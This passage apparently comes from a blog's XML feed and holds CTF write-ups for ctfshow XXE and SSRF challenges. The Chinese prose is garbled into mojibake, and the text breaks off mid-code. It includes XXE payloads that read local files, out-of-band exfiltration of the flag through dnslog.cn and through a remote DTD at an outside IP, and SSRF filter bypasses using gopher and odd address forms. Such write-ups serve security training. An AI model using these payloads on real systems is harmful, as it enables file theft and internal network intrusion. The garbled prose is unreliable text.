src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowXXE</title>
      <link href="/posts/949d2db6.html"/>
      <url>/posts/949d2db6.html</url>
      
        <content type="html"><![CDATA[<h2 id="XMLåŸºç¡€çŸ¥è¯†"><a href="#XMLåŸºç¡€çŸ¥è¯†" class="headerlink" title="XMLåŸºç¡€çŸ¥è¯†"></a>XMLåŸºç¡€çŸ¥è¯†</h2><p>è¦äº†è§£xxeæ¼æ´ï¼Œé‚£ä¹ˆä¸€å®šå¾—å…ˆæ˜ç™½åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£xmlæ–‡æ¡£çš„åŸºç¡€ç»„æˆã€‚</p><blockquote><p>XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </p></blockquote><h3 id="xmlçš„åŸºæœ¬æ ¼å¼"><a href="#xmlçš„åŸºæœ¬æ ¼å¼" class="headerlink" title="xmlçš„åŸºæœ¬æ ¼å¼"></a>xmlçš„åŸºæœ¬æ ¼å¼</h3><pre class="line-numbers language-none"><code class="language-none">- æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾- XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ- XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—- XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ - XML çš„å±æ€§å€¼é¡»åŠ å¼•å·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ”¾ä¸€ä¸ªæ­£è§„çš„ä¾‹å­</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--æ ¹å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„ç»“æŸ--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„ç»“æŸ--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢è¿™ä¸ª DTD å°±å®šä¹‰äº† XML çš„æ ¹å…ƒç´ æ˜¯ messageï¼Œç„¶åè·Ÿå…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆ XML åˆ°æ—¶å€™å¿…é¡»åƒä¸‹é¢è¿™æ ·</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><span class="token punctuation">></span></span>Myself<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sender</span><span class="token punctuation">></span></span>Someone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sender</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>TheReminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msg</span><span class="token punctuation">></span></span>This is an amazing book<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å†…éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“</h3><p>å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;&lt;message&gt;&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;&lt;sender&gt;Someone&lt;&#x2F;sender&gt;&lt;header&gt;TheReminder&lt;&#x2F;header&gt;&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å®é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ï¼Œæ¯•ç«Ÿ ML ä¸­é™¤äº†èƒ½æ ‡ç­¾ä»¥å¤–ï¼Œè¿˜éœ€è¦æœ‰äº›å†…å®¹æ˜¯å›ºå®šçš„</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ å®šä¹‰å…ƒç´ ä¸º<code>ANY</code>è¯´æ˜æ¥å—ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ä¸ª xml çš„å®ä½“ï¼ˆå®ä½“å…¶å®å¯ä»¥çœ‹æˆä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨ XML ä¸­é€šè¿‡ &amp; ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆ XML å°±å¯ä»¥å†™æˆè¿™æ ·</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;&lt;pass&gt;mypass&lt;&#x2F;pass&gt;&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬ä½¿ç”¨&amp;xxeå¯¹ä¸Šé¢å®šä¹‰çš„xxeå®ä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™&amp;xxeå°±ä¼šè¢« â€œtestâ€ æ›¿æ¢ã€‚</p><h3 id="å¤–éƒ¨å®ä½“"><a href="#å¤–éƒ¨å®ä½“" class="headerlink" title="å¤–éƒ¨å®ä½“"></a>å¤–éƒ¨å®ä½“</h3><p>å®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ï¼Œä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®ä½“ï¼Œä½†æ˜¯å®ä½“å®é™…ä¸Šå¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210305225448278.png"></p><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨å…¬ç”¨ DTD çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨</p><p>æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®é™…ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ï¼‰</p><h3 id="é€šç”¨å®ä½“"><a href="#é€šç”¨å®ä½“" class="headerlink" title="é€šç”¨å®ä½“"></a>é€šç”¨å®ä½“</h3><p>ç”¨<code>&amp;å®ä½“å;</code> å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;      &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;      ... &lt;&#x2F;updateProfile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h3><p>(1)ä½¿ç”¨ % å®ä½“å(è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ %å®ä½“å; å¼•ç”¨<br>(2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“<br>(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; %an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨äº†è§£äº†åŸºç¡€çŸ¥è¯†åï¼Œä¸‹é¢å¼€å§‹äº†è§£xmlå¤–éƒ¨å®ä½“æ³¨å…¥å¼•å‘çš„é—®é¢˜</p><p><strong>373</strong></p><p>æœ€ç®€å•çš„ç‰ˆæœ¬å’¯ï¼Œå¸¦å›æ˜¾ç›´æ¥æ„é€ </p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xml</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>j1an</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>j1an</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>374</strong></p><p>æ²¡æœ‰å›æ˜¾éœ€è¦å¤–å¸¦äº†</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE xml [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;&amp;file;.i1ecvd.dnslog.cn&quot;&gt;]&gt;&lt;j1an&gt;&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;j1an&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ç§æ–¹æ³•ä¸çŸ¥é“ä¸ºå•¥å¸¦ä¸å‡ºæ¥</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.xml&quot;&gt;%remote;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">#1.xml&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.php?1&#x3D;%file;&#39;&gt;&quot;&gt;&amp;all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowSSRF</title>
      <link href="/posts/b1fc6cca.html"/>
      <url>/posts/b1fc6cca.html</url>
      
        <content type="html"><![CDATA[<h2 id="SSRFåŸºç¡€"><a href="#SSRFåŸºç¡€" class="headerlink" title="SSRFåŸºç¡€"></a>SSRFåŸºç¡€</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><h2 id="ç›¸å…³å‡½æ•°å’Œç±»"><a href="#ç›¸å…³å‡½æ•°å’Œç±»" class="headerlink" title="ç›¸å…³å‡½æ•°å’Œç±»"></a>ç›¸å…³å‡½æ•°å’Œç±»</h2><p>file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­<br>readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹<br>fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥<br>curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨<br>fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URL<br>PHPåŸç”Ÿç±»SoapClientåœ¨è§¦å‘ååºåˆ—åŒ–æ—¶å¯å¯¼è‡´SSRF</p><h2 id="ç›¸å…³åè®®"><a href="#ç›¸å…³åè®®" class="headerlink" title="ç›¸å…³åè®®"></a>ç›¸å…³åè®®</h2><p>fileåè®®ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹<br>dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰<br>gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell<br>http/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p><h2 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h2><ul><li><p><code>http://0.0.0.0/</code></p><p>æµ‹è¯•äº†ä¸‹è¿™ä¸ªæ–¹æ³•åªèƒ½åœ¨linuxä¸‹ä½¿ç”¨ï¼Œwindowså¹¶ä¸è®¤è¯†è¿™ä¸ªIP</p></li><li><p><code>http://foo@127.0.0.1:80@www.google.com/hint.php</code></p><p>æ­¤å¤„åˆ©ç”¨äº†ä¸åŒåº“è§£æurlçš„å·®å¼‚</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206181201647.JPG"></p><p>ä¸è¿‡è¿™ä¸ªæ–¹æ³•åœ¨curlè¾ƒæ–°çš„ç‰ˆæœ¬é‡Œè¢«ä¿®æ‰äº†ï¼Œbuuä¸Šçš„ç¯å¢ƒä¹Ÿæ— æ³•ä½¿ç”¨</p></li><li><p>DNS Rebinding</p><p>ç”¨è¿™ä¸ªï¼Œå°†åŒä¸€åŸŸåç»‘å®šåœ¨ä¸åŒçš„IPä¸‹ï¼Œè¿™æ ·è¿”å›DNSè¯·æ±‚æŸ¥è¯¢çš„æ—¶å€™éšæœºè¿”å›ä¸€ä¸ªï¼Œå°±å¯¼è‡´åˆ¤æ–­å’ŒçœŸæ­£curlå‘é€è¯·æ±‚çš„ä¸æ˜¯åŒä¸€ä¸ªIP</p></li><li><p><code>http://127ã€‚0ã€‚0ã€‚1/hint.php</code></p><p>è¿™ä¸ªæœ¬åœ°å€’æ˜¯æµ‹è¯•æˆåŠŸäº†ï¼Œbuuä¸Šå°±ä¸è¡Œï¼Œå¯èƒ½è·Ÿcurlç‰ˆæœ¬æœ‰å…³å§</p></li><li><p><code>http://127.1/hint.php</code></p><p><code>ip2long(&#39;127.1&#39;)</code>ä¼šè¿”å›<code>false</code>ï¼Œè¿™é‡Œå¯ä»¥ç»•è¿‡</p><p>ä½†æ˜¯<code>gethostbyname</code>åœ¨linuxä¸‹ä¼šæŠŠ<code>127.1</code>å˜ä¸º<code>127.0.0.1</code>ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯æ— æ³•ä½¿ç”¨çš„</p><p>ä¸è¿‡windowsä¸‹ç»è¿‡<code>gethostbyname</code>åä¾ç„¶æ˜¯<code>127.1</code>ï¼Œcurlæ˜¯æ”¯æŒ<code>127.1</code>è¿™æ ·çš„å†™æ³•çš„ï¼Œä½†è¿™æ ·å‘å‡ºå»çš„httpè¯·æ±‚æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºhttpåŒ…ä¸­çš„hostå¤´è¢«è®¾ä¸ºäº†<code>127.1</code>ï¼Œapacheä¼šè¿”å›ä¸€ä¸ª400 Bad Request</p><p>ä½†æ˜¯è¿™æ ·æ„é€ çš„gopherè¯·æ±‚æ˜¯å¯è¡Œçš„</p></li><li><p>è¿›åˆ¶ç»•è¿‡</p></li><li><p>å’Œ127.1ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å­˜åœ¨ä¸èƒ½ç”¨httpçš„é—®é¢˜ï¼Œä½†æ˜¯<code>gethostbyname</code>å¹¶ä¸ä¼šæœ‰å½±å“ï¼Œå¯ç”¨æ¯”å¦‚</p><pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;0177.0.0x0001:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>http://127.0.0.1./</code></p><p>curlä¸æ”¯æŒ</p></li></ul><p><strong>351</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);highlight_file(__FILE__);$url&#x3D;$_POST[&#39;url&#39;];$ch&#x3D;curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result&#x3D;curl_exec($ch);curl_close($ch);echo ($result);?&gt;# curl_init â€” åˆå§‹åŒ– cURL ä¼šè¯    # curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹# curl_exec â€” æ‰§è¡Œ cURL ä¼šè¯# curl_close â€” å…³é—­ cURL ä¼šè¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:POST:url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>352</strong></p><p><code>parse_url</code>å‡½æ•°ä½œç”¨æ˜¯å°†ä¸€ä¸ªURLæ‹†åˆ†ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-PHP" data-language="PHP"><code 